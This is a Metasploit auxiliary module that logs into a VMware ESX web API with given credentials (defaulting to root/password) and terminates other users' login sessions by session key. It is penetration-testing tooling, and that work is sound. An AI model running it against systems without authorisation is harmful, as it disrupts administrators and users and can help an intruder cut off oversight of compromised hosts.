##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::VIMSoap

  def initialize
    super(
      'Name'           => 'VMWare Terminate ESX Login Sessions',
      'Description'    => %Q{
        This module will log into the Web API of VMWare and try to terminate
        user login sessions as specified by the session keys.},
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true }
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [ true, "The username to Authenticate with.", 'root' ]),
        OptString.new('PASSWORD', [ true, "The password to Authenticate with.", 'password' ]),
        OptString.new('KEYS', [true, "The session key to terminate"])
      ])
  end

  def run

    if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success
      Shellwords.split(datastore['KEYS']).each do |key|
        result = vim_terminate_session(key)
        case result
        when :notfound
          print_error "The specified Session was not found. Check your key: #{key}"
        when :success
          print_good "The supplied session was terminated successfully: #{key}"
        when :error
          print_error "There was an error encountered terminating: #{key}"
        end
      end
    else
      print_error "Login Failure on #{datastore['RHOST']}"
      return
    end
  end
end
